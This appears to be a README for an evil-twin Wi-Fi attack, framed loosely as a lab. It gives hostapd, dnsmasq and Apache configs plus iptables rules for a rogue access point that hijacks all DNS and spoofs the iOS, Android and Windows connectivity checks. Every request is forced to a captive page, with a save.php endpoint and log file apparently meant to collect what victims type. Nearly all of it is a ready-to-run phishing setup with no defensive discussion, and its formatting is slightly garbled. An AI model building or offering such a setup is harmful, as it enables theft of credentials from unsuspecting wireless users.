# Evil-Twin
Set up your LAB
install:
```bash
sudo apt update
sudo apt install -y hostapd dnsmasq lighttpd php
``  

```
dnsmasq.conf file:
```bash
interface=wlan0
bind-interfaces
no-resolv
log-queries

dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1

address=/#/192.168.50.1

address=/captive.apple.com/192.168.50.1
address=/www.msftconnecttest.com/192.168.50.1
address=/connectivitycheck.gstatic.com/192.168.50.1

```

hostapd.conf:
```bash
interface=wlan0
driver=nl80211
ssid=LabPortal
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=0
```



wlan0 interface:
```bash
sudo ip link set wlan0 down
sudo ip addr flush dev wlan0
sudo ip addr add 192.168.50.1/24 dev wlan0
sudo ip link set wlan0 up

```

PHP + Apache:
```bash
sudo apt update
sudo apt install -y apache2 php libapache2-mod-php
sudo systemctl enable --now apache2
```

start:
```bash
sudo hostapd hostapd.conf
sudo dnsmasq -C dnsmasq.conf
```

New Models:
```bash
sudo a2enmod rewrite
sudo a2enmod headers
sudo systemctl restart apache2
```

Create Folder:
```bash
sudo mkdir -p /var/www/captive
```
Create File:
```bash
/var/www/captive/index.html
/var/www/captive/save.php
```
Create Log file:
```bash
touch /var/log/captive.log
```
Permission to log file:
```bash
sudo chown www-data:www-data /var/log/captive.log
sudo chmod 664 /var/log/captive.log
```

New Vhost:
```bash
nano /etc/apache2/sites-available/captive.conf
```
```bash
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive


    <Directory /var/www/captive>
        AllowOverride All
        Require all granted
    </Directory>

 
    # iOS/macOS
    Alias /hotspot-detect.html /var/www/captive/index.html
    # Android
    Alias /generate_204 /var/www/captive/index.html
    # Windows
    Alias /connecttest.txt /var/www/captive/index.html

   
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/save\.php$
    RewriteRule ^.*$ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</VirtualHost>
```
```bash
sudo a2ensite captive.conf
sudo a2dissite 000-default.conf
sudo systemctl reload apache2
```


IpTables:
```bash
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j REDIRECT --to-ports 53
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j REDIRECT --to-ports 53


```
